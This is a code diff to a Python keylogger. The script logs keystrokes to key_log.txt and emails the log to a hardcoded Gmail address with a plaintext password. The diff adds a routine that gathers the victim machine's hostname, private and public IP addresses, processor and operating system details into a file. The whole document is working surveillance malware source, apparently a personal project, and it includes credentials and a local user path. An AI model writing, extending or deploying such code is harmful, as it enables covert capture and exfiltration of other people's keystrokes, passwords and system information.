@@ -28,12 +28,13 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
-email_address = ""
-password = " "
+system_information = "systeminfo.txt"
+email_address = "randomemailentry01@gmail.com"
+password = " simplePass"
 
 username = getpass.getuser()
 
-toaddr = ""
+toaddr = "randomemailentry01@gmail.com"
 
 file_path = 'C:\\Users\\Christian Yehle\\Documents\\Logger'
 extend = "\\"
@@ -84,6 +85,28 @@ def send_email(filename, attachment, toaddr):
 
 
 send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+def computer_information():
+    with open(file_path + extend + system_information, "a") as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org" + "\n").text
+            f.write("Public Ip Address: " + public_ip)
+
+        except Exception:
+            f.write("Couldnt get public Ip Address. Max Query?")
+
+        f.write("Processor Info: " + (platform.processor()) + '\n')
+        f.write("System: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine Info: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP: " + IPAddr + "\n")
+
+computer_information()
+
+
+
 
 count = 0
 keys = []
